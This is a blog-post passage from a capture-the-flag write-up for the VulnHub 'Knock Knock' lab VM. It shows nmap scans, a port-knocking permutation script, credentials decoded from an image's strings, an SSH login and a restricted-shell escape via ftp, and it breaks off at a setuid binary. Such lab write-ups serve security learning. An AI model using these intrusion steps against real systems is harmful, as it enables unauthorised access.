
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Knock Knock&#8230; Who&#8217;s There ? - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="zer0w1re released his first VM, Knock Knock, so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">Knock Knock&#8230; Who&#8217;s There ?</h2>
	<div class="entry-content"><p><a href="https://twitter.com/zer0w1re">zer0w1re</a> released his first VM, <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a>, so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup is for the version available on Vulnhub.)</p>

<!-- more -->


<p><img src="http://www.quickmeme.com/img/24/24feb14fa531ddb2c9fbe31c1607f6b71e1dd30c6b5820790e8110da7f8f8d3e.jpg" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T5 -p- -O --script banner 172.16.56.139
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-23 18:55 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.139
</span><span class='line'>Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65534</span> filtered ports
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>1337/tcp open  waste
</span><span class='line'><span class="p">|</span>_banner: <span class="o">[</span>57154, 48662, 9528<span class="o">]</span>
</span><span class='line'>MAC Address: 00:0C:29:DE:8D:33 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 3.2, Linux 3.2 - 3.10
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>
</span><span class='line'>OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 94.00 seconds
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Connecting to port 1337 results in 3 numbers.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 172.16.56.139 1337
</span><span class='line'><span class="o">[</span>56861, 38987, 45887<span class="o">]</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>I guess I&rsquo;m knocking some ports then.
NB: in the test version, these 3 ports were in order, in the release version they&rsquo;re randomised. So rather than knocking them in the order returned, we&rsquo;re going to have to write a python script to do all possible port orders. The fun thing here is we don&rsquo;t need to check anything after each knock attempt - we just knock the port numbers in all possible combinations and then check afterwards for any new ports.</p>

<p>I couldn&rsquo;t be bothered to write my own script, so I stole <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">Leonjza&rsquo;s</a>, as I was talking to him about it at the time</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">destination</span> <span class="o">=</span> <span class="s">&quot;192.168.56.203&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">clean_up_ports</span><span class="p">(</span><span class="n">raw_string</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot; Clean up the raw string received on the socket&quot;&quot;&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_string</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Remove the first [</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;[&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># Remove the second ]</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;]&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># split by commas</span>
</span><span class='line'>    <span class="n">first_list</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># start e empty return list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">first_list</span><span class="p">:</span>
</span><span class='line'>        <span class="c"># strip the whitespace around the string</span>
</span><span class='line'>        <span class="c"># and cast to a integer</span>
</span><span class='line'>        <span class="n">ports</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span>  <span class="n">ports</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Getting sequence&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
</span><span class='line'>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Unable to connect to </span><span class="si">%s</span><span class="s"> on port 1337. </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># receive the list</span>
</span><span class='line'>    <span class="n">raw_list</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># get the ports in a actual python list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="n">clean_up_ports</span><span class="p">(</span><span class="n">raw_list</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sequence is </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">ports</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knocking on the door using all the possible combinations...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Lets knock all of the possible combinations of the ports list</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port_list</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Knocking with sequence: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">port_list</span><span class="p">,)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">port_list</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Knocking on port </span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Finished sequence knock</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knock knock opener&quot;</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>He&rsquo;s a clever one :P</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# python knock.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knock knock opener
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Getting sequence
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Sequence is <span class="o">[</span>37430, 5311, 17504<span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on the door using all the possible combinations...
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>37430, 5311, 17504<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>37430, 17504, 5311<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>5311, 37430, 17504<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>5311, 17504, 37430<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>17504, 37430, 5311<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>17504, 5311, 37430<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Now another NMAP is required to see what opened (if anything)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~/# nmap -sS -T5 --script banner 172.16.56.139
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-23 19:14 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.139
</span><span class='line'>Host is up <span class="o">(</span>0.00025s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">998</span> filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 00:0C:29:DE:8D:33 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 25.87 seconds
</span><span class='line'>root@pwk:~/#
</span></code></pre></td></tr></table></div></figure>


<p>The HTTP server is hosting a simple page, which displays an image of a door, and text asking us to look deeper.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png" alt="knockknock_001" /></a></p>

<p>Now, if that&rsquo;s not an invitation to look inside the JPG, then I don&rsquo;t know what is.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# wget http://172.16.56.139/knockknock.jpg
</span><span class='line'>--2014-10-23 19:17:39--  http://172.16.56.139/knockknock.jpg
</span><span class='line'>Connecting to 172.16.56.139:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">84741</span> <span class="o">(</span>83K<span class="o">)</span> <span class="o">[</span>image/jpeg<span class="o">]</span>
</span><span class='line'>Saving to: <span class="sb">`</span>knockknock.jpg<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[======================================================================================================================================================================================================&gt;] 84,741      --.-K/s   in 0s      </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-10-23 19:17:39 (612 MB/s) - `knockknock.jpg&#39;</span> saved <span class="o">[</span>84741/84741<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@pwk:~# strings knockknock.jpg
</span><span class='line'>JFIF
</span><span class='line'>Ducky
</span><span class='line'>http://ns.adobe.com/xap/1.0/
</span><span class='line'>************************************ SNIP ! ************************************
</span><span class='line'>qW<span class="p">|</span>U
</span><span class='line'><span class="se">\+\U</span>
</span><span class='line'>Login Credentials
</span><span class='line'>abfnW
</span><span class='line'>sax2Cw9Ow
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Ooh, some possible credentials. They look like ROT13, so&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# python rot13.py abfnW
</span><span class='line'>nosaJ
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>OK, that&rsquo;s just Jason reversed, so I guess the same deal for the password.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# python rot13.py sax2Cw9Ow <span class="p">|</span> rev
</span><span class='line'>jB9jP2knf
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh jason@172.16.56.139
</span><span class='line'>jason@172.16.56.139<span class="err">&#39;</span>s password: jB9jP2knf
</span><span class='line'>Linux knockknock 3.2.0-4-486 <span class="c">#1 Debian 3.2.60-1+deb7u3 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have new mail.
</span><span class='line'>Last login: Mon Oct  <span class="m">6</span> 12:33:37 <span class="m">2014</span> from 192.168.56.202
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 8
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root jason <span class="m">7457</span> Oct <span class="m">11</span> 18:35 tfc
</span><span class='line'>jason@knockknock:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like we&rsquo;re in a restricted bash shell, so lets escape that quickly</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc
</span><span class='line'>-rbash: ./tfc: restricted: cannot specify <span class="sb">`</span>/<span class="err">&#39;</span> in <span class="nb">command </span>names
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ftp
</span><span class='line'>ftp&gt; !
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc
</span><span class='line'>_______________________________
</span><span class='line'><span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
</span><span class='line'>  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
</span><span class='line'>                <span class="se">\/</span>            <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>  Tiny File Crypter - 1.0
</span><span class='line'>
</span><span class='line'>Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, so the next part is probably explained a lot better by reading some IRC logs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
